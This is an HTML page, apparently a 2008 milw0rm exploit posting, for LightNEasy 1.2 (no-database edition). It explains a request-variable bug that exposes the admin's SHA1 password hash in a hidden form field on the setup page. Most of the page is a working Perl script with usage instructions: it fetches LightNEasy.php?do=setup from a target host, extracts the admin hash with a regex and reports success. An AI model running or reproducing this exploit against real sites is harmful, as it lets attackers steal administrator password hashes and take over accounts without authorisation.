<html><head><title>LightNEasy 1.2 (no database) Remote Hash Retrieve Exploit</title></head><pre># Author:	__GiReX__
# mySite:	girex.altervista.org
# Date:		10/04/08

# CMS: 		LightNEasy 1.2 no database
# Site:		lightneasy.org

# Bug:		Hash Disclosure
# Exploit:	Remote Hash Retrieve


# Bug Explanation: LightNEasy/lightneasy.php

  if($_GET['do']!=&quot;login&quot; &amp;&amp; $_GET['do']!=&quot;sitemap&quot; &amp;&amp; $_SESSION[$set['password']] != &quot;1&quot;) unset($_GET['do']);
  if($_POST['submit']!=$langmessage[120] &amp;&amp; $_POST['submit']!=$langmessage[33] &amp;&amp; $_SESSION[$set['password']] != &quot;1&quot;)
	unset($_POST['submit']);

# $_GET['do'] is unset if we aren't admin or isn't login or sitemap

  function content() {
  ...
  switch($_REQUEST['do']) {
  ...
  case &quot;setup&quot;: {
  ...
  &lt;input type=\&quot;hidden\&quot; name=\&quot;oldpassword\&quot; value=\&quot;&quot;.$set['password'].&quot;\&quot; /&gt;

# content() diplays the HTML of the section passed with $_REQUEST['do']
# unset $_GET['do'] is not important if you switch the $_REQUEST one
# you can only see the admin's hash in hidden input and not edit it becouse $_POST['submit'] is unset


#!/usr/bin/perl -w
use strict;
use LWP::UserAgent;

if(not defined $ARGV[0])
{
     banner();
     print &quot;[-] Usage: perl $0 [host] [path]\n&quot;;
     print &quot;[-] Example: perl $0 localhost /lightneasy/\n\n&quot;;
     exit;
}
my $client = new LWP::UserAgent or exit;

my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];

banner();
my $response = $client-&gt;get($target . 'LightNEasy.php?do=setup');

if($response-&gt;is_success)
{
     if($response-&gt;as_string =~ /([a-f0-9]{40})/)
     {
	  print &quot;[+] Admin's SHA1 Hash: $1 \n&quot;;
	  print &quot;[+] Exploit Successfull\n&quot;;
     }
     else 
     {
	  print &quot;[-] Unable to retrieve admin's hash\n&quot;;
	  print &quot;[-] Exploit Failed\n&quot;;
     }
}
else
{
     print &quot;[-] Unable to request ${target}LightNEasy.php?do=setup\n&quot;;
     print &quot;[-] Exploit Failed\n&quot;;
}


sub banner
{
     print &quot;[+] LightNEasy 1.2 no database Password Retrieve Exploit\n&quot;;
     print &quot;[+] Coded by __GiReX__\n&quot;;
     print &quot;\n&quot;;
}

# milw0rm.com [2008-04-10]</pre></html>